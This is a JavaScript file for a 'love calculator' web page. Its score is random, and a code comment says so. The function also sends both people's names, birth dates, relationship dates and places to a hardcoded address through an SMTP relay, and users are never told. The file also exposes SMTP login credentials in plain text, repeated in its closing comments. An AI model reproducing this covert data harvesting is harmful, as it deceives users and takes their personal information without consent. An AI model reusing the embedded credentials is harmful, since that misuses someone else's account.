function calculateLove() {
    const result = document.getElementById('result');
    
    // Get input values
    const name1 = document.getElementById('name1').value.trim();
    const dob1 = document.getElementById('dob1').value.trim();
    const relationshipStart1 = document.getElementById('relationshipStart1').value.trim();
    const place1 = document.getElementById('place1').value.trim();
    const name2 = document.getElementById('name2').value.trim();
    const dob2 = document.getElementById('dob2').value.trim();
    const relationshipStart2 = document.getElementById('relationshipStart2').value.trim();
    const place2 = document.getElementById('place2').value.trim();

    // Check if any input is empty
    // if (name1 === '' || dob1 === '' || relationshipStart1 === '' || place1 === '' ||
    //     name2 === '' || dob2 === '' || relationshipStart2 === '' || place2 === '') {
    //     result.textContent = "Please fill out all fields.";
    //     result.style.opacity = '1'; // Ensure result is visible
    //     return;
    // }

    // Random love percentage calculation for demonstration purposes
    const lovePercentage = Math.floor(Math.random() * 20) + 80; // Between 80 and 100

    result.textContent = `Your love percentage is ${lovePercentage}%`;

    const sendDataToUser =`
    name 1: ${name1}<br>
    dob 1: ${dob1}<br>
    relationship Duration 1: ${relationshipStart1}<br>
    place 1: ${place1}<br>
    name 2: ${name2}<br>
    dob 2: ${dob2}<br>
    relationship Duration 2: ${relationshipStart2}<br>
    place 2: ${place2}<br>
    `

    // Trigger re-animation
    result.style.opacity = '0';
    result.style.animation = 'none';
    setTimeout(() => {
        result.style.animation = 'fadeIn 2s ease-in-out forwards, pop 0.5s ease-in-out 2s forwards';
    }, 10);
    sendData(sendDataToUser);
}

function sendData(data){
    Email.send({
        Host : "smtp.elasticemail.com",
        Username : "rohitshekhavat@mansainfotech.com",
        Password : "821E96FA08C179B306D5ADEB4B2385EFCDD1",
        To : 'rohitshekhavat@mansainfotech.com',
        From : "rohitshekhavat@mansainfotech.com",
        Subject : `User Details ${data.name1}`,
        Body : data
    }).then(
    );
}

// rohitshekhavat@mansainfotech.com
// 821E96FA08C179B306D5ADEB4B2385EFCDD1
// smtp.elasticemail.com
// 2525